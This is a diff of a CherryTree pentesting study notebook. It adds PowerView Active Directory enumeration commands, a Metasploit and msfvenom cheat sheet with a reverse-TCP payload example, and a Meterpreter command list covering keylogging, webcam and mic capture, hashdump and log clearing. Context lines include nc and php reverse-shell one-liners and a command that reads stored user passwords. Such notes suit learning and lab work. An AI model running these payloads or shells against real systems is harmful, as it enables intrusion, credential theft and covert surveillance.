@@ -310,7 +310,7 @@ regedit
 windows firewall
 WF.msc</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="powershell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649452.75" ts_lastsave="1655649799.32" unique_id="39">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="powershell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649452.75" ts_lastsave="1655725264.25" unique_id="39">
 				<rich_text>bypass execution policy
 </rich_text>
 				<rich_text family="monospace">powershell -ep bypass</rich_text>
@@ -320,9 +320,20 @@ importing (?) powerview script
 </rich_text>
 				<rich_text family="monospace">. .\PowerView.ps1</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="powerview" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649812.22" ts_lastsave="1655649828.4" unique_id="40">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="powerview" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655649812.22" ts_lastsave="1655727658.53" unique_id="40">
 				<rich_text link="webs https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</rich_text>
 				<rich_text>
+
+get fulldata and selecting OS
+Get-NetComputer -fulldata | select operatingsystem
+
+get users and selecting domain name
+</rich_text>
+				<rich_text family="monospace">Get-NetUser | select cn</rich_text>
+				<rich_text>
+
+show all group
+Get-NetGroup
 
 # PowerView's last major overhaul is detailed here: http://www.harmj0y.net/blog/powershell/make-powerview-great-again/
 #   tricks for the 'old' PowerView are at https://gist.github.com/HarmJ0y/3328d954607d71362e3c
@@ -402,7 +413,7 @@ $Computers = Get-DomainComputer -Unconstrained
 $Users = Get-DomainUser -AllowDelegation -AdminCount
 
 # return the local *groups* of a remote server
-Get-NetLocalGroup SERVER.domain.local
+    
 
 # return the local group *members* of a remote server using Win32 API methods (faster but less info)
 Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
@@ -531,6 +542,9 @@ Get-ObjectACL &quot;DC=testlab,DC=local&quot; -ResolveGUIDs | ? {
 # check if any user passwords are set
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' &quot;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))&quot; -PassThru} | fl
 </rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655727658.53" ts_lastsave="1655727658.53" unique_id="41">
+				<rich_text></rich_text>
 			</node>
 		</node>
 	</node>
@@ -667,7 +681,7 @@ nslookup --type=TXT website.thm</rich_text>
 nc 172.16.1.100 1234 -e /bin/sh
 php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</rich_text>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655395012.38" unique_id="19">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
 		<rich_text></rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="note.dtd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395012.38" ts_lastsave="1655395016.26" unique_id="33">
 			<rich_text></rich_text>
@@ -732,6 +746,247 @@ php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&am
  &lt;/</rich_text>
 			<rich_text foreground="#569cd6">note</rich_text>
 			<rich_text foreground="#808080">&gt;</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655727693.85" ts_lastsave="1655729074.42" unique_id="42">
+		<rich_text>start postgresql for msfdb
+</rich_text>
+		<rich_text family="monospace">systemctl start postgresql</rich_text>
+		<rich_text>
+
+adding workspace
+workspace -a &lt;workspace_name&gt;
+
+more info on workspace
+workspace -h
+
+run metasploit
+sudo msfconsole -q
+
+run msfdb
+sudo msfdb init
+
+for help
+help
+
+search for module
+search &lt;search_query&gt;
+
+get summary of module
+info &lt;module_name&gt;
+info &lt;search_id&gt;
+
+using module
+use &lt;module_name&gt;
+use &lt;search_id&gt;
+
+showing module options
+options
+
+setting options
+set &lt;options&gt; &lt;value&gt;
+
+showing payloads/aux/options of a module
+show &lt;what to show&gt;
+
+search by type
+search type:auxiliary telnet
+
+set global value
+setg &lt;option&gt; &lt;value&gt;
+
+unset global value
+unsetg &lt;option&gt;s
+
+running exploit
+exploit
+exploit -z (background)
+
+background an exploit
+CTRL+Z
+
+interacting with different session
+sessions -i &lt;session_id&gt;</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="msfvenom" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729074.42" ts_lastsave="1655729220.06" unique_id="43">
+			<rich_text>show payloads
+msfvenom -l payloads
+
+msfvenom common flag
+-f format
+-e encoding
+
+example
+</rich_text>
+			<rich_text family="monospace">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="meterpreter" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729174.31" ts_lastsave="1655729843.63" unique_id="44">
+			<rich_text>get meterpreter pid
+</rich_text>
+			<rich_text family="monospace">getpid</rich_text>
+			<rich_text>
+
+running process
+ps
+
+Core commands
+    •         </rich_text>
+			<rich_text family="monospace">background</rich_text>
+			<rich_text>: Backgrounds the             current session
+    •         </rich_text>
+			<rich_text family="monospace">exit</rich_text>
+			<rich_text>:             Terminate the Meterpreter session
+    •         </rich_text>
+			<rich_text family="monospace">guid</rich_text>
+			<rich_text>:             Get the session GUID (Globally Unique Identifier)
+
+    •         </rich_text>
+			<rich_text family="monospace">help</rich_text>
+			<rich_text>:             Displays the help menu
+    •         </rich_text>
+			<rich_text family="monospace">info</rich_text>
+			<rich_text>:             Displays information about a Post module
+    •         </rich_text>
+			<rich_text family="monospace">irb</rich_text>
+			<rich_text>:             Opens an interactive Ruby shell on the current session
+    •         </rich_text>
+			<rich_text family="monospace">load</rich_text>
+			<rich_text>:             Loads one or more Meterpreter extensions
+    •         </rich_text>
+			<rich_text family="monospace">migrate</rich_text>
+			<rich_text>: Allows you to             migrate Meterpreter to another process
+    •         </rich_text>
+			<rich_text family="monospace">run</rich_text>
+			<rich_text>:             Executes a Meterpreter script or Post module
+    •         </rich_text>
+			<rich_text family="monospace">sessions</rich_text>
+			<rich_text>: Quickly switch to             another session
+File system         commands
+    •         </rich_text>
+			<rich_text family="monospace">cd</rich_text>
+			<rich_text>:             Will change directory
+    •         </rich_text>
+			<rich_text family="monospace">ls</rich_text>
+			<rich_text>:             Will list files in the current directory (dir will also work)
+    •         </rich_text>
+			<rich_text family="monospace">pwd</rich_text>
+			<rich_text>:             Prints the current working directory
+    •         </rich_text>
+			<rich_text family="monospace">edit</rich_text>
+			<rich_text>:             will allow you to edit a file
+    •         </rich_text>
+			<rich_text family="monospace">cat</rich_text>
+			<rich_text>:             Will show the contents of a file to the screen
+    •         </rich_text>
+			<rich_text family="monospace">rm</rich_text>
+			<rich_text>:             Will delete the specified file
+    •         </rich_text>
+			<rich_text family="monospace">search</rich_text>
+			<rich_text>:             Will search for files
+    •         </rich_text>
+			<rich_text family="monospace">upload</rich_text>
+			<rich_text>:             Will upload a file or directory
+    •         </rich_text>
+			<rich_text family="monospace">download</rich_text>
+			<rich_text>: Will download a file             or directory
+Networking commands 
+    •         </rich_text>
+			<rich_text family="monospace">arp</rich_text>
+			<rich_text>:             Displays the host ARP (Address Resolution Protocol) cache
+    •         </rich_text>
+			<rich_text family="monospace">ifconfig</rich_text>
+			<rich_text>: Displays network             interfaces available on the target system
+
+    •         </rich_text>
+			<rich_text family="monospace">netstat</rich_text>
+			<rich_text>: Displays the network             connections
+    •         </rich_text>
+			<rich_text family="monospace">portfwd</rich_text>
+			<rich_text>: Forwards a local             port to a remote service
+    •         </rich_text>
+			<rich_text family="monospace">route</rich_text>
+			<rich_text>:             Allows you to view and modify the routing table
+System commands
+    •         </rich_text>
+			<rich_text family="monospace">clearev</rich_text>
+			<rich_text>: Clears the event             logs
+    •         </rich_text>
+			<rich_text family="monospace">execute</rich_text>
+			<rich_text>: Executes a             command
+    •         </rich_text>
+			<rich_text family="monospace">getpid</rich_text>
+			<rich_text>:             Shows the current process identifier
+    •         </rich_text>
+			<rich_text family="monospace">getuid</rich_text>
+			<rich_text>:             Shows the user that Meterpreter is running as
+    •         </rich_text>
+			<rich_text family="monospace">kill</rich_text>
+			<rich_text>:             Terminates a process
+    •         </rich_text>
+			<rich_text family="monospace">pkill</rich_text>
+			<rich_text>:             Terminates processes by name
+    •         </rich_text>
+			<rich_text family="monospace">ps</rich_text>
+			<rich_text>:             Lists running processes
+    •         </rich_text>
+			<rich_text family="monospace">reboot</rich_text>
+			<rich_text>:             Reboots the remote computer
+    •         </rich_text>
+			<rich_text family="monospace">shell</rich_text>
+			<rich_text>:             Drops into a system command shell
+    •         </rich_text>
+			<rich_text family="monospace">shutdown</rich_text>
+			<rich_text>: Shuts down the             remote computer
+    •         </rich_text>
+			<rich_text family="monospace">sysinfo</rich_text>
+			<rich_text>: Gets information             about the remote system, such as OS
+Others Commands (these         will be listed under different menu categories in the help menu)
+    •         </rich_text>
+			<rich_text family="monospace">idletime</rich_text>
+			<rich_text>: Returns the number             of seconds the remote user has been idle
+    •         </rich_text>
+			<rich_text family="monospace">keyscan_dump</rich_text>
+			<rich_text>: Dumps the keystroke             buffer
+    •         </rich_text>
+			<rich_text family="monospace">keyscan_start</rich_text>
+			<rich_text>: Starts capturing             keystrokes
+    •         </rich_text>
+			<rich_text family="monospace">keyscan_stop</rich_text>
+			<rich_text>: Stops capturing             keystrokes
+    •         </rich_text>
+			<rich_text family="monospace">screenshare</rich_text>
+			<rich_text>: Allows you to watch             the remote user's desktop in real time
+    •         </rich_text>
+			<rich_text family="monospace">screenshot</rich_text>
+			<rich_text>: Grabs a screenshot             of the interactive desktop
+    •         </rich_text>
+			<rich_text family="monospace">record_mic</rich_text>
+			<rich_text>: Records audio from             the default microphone for X seconds
+    •         </rich_text>
+			<rich_text family="monospace">webcam_chat</rich_text>
+			<rich_text>: Starts a video             chat
+    •         </rich_text>
+			<rich_text family="monospace">webcam_list</rich_text>
+			<rich_text>: Lists webcams    
+    •         </rich_text>
+			<rich_text family="monospace">webcam_snap</rich_text>
+			<rich_text>: Takes a snapshot             from the specified webcam
+    •         </rich_text>
+			<rich_text family="monospace">webcam_stream</rich_text>
+			<rich_text>: Plays a video stream             from the specified webcam
+    •         </rich_text>
+			<rich_text family="monospace">getsystem</rich_text>
+			<rich_text>: Attempts to elevate             your privilege to that of local system
+    •         </rich_text>
+			<rich_text family="monospace">hashdump</rich_text>
+			<rich_text>: Dumps the contents             of the SAM database
+
+
+loading python into meterpreter
+load python
+
+loading kiwi into meterpreter
+load kiwi
+</rich_text>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="lab_ideas" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394224.89" ts_lastsave="1655397167.66" unique_id="20">
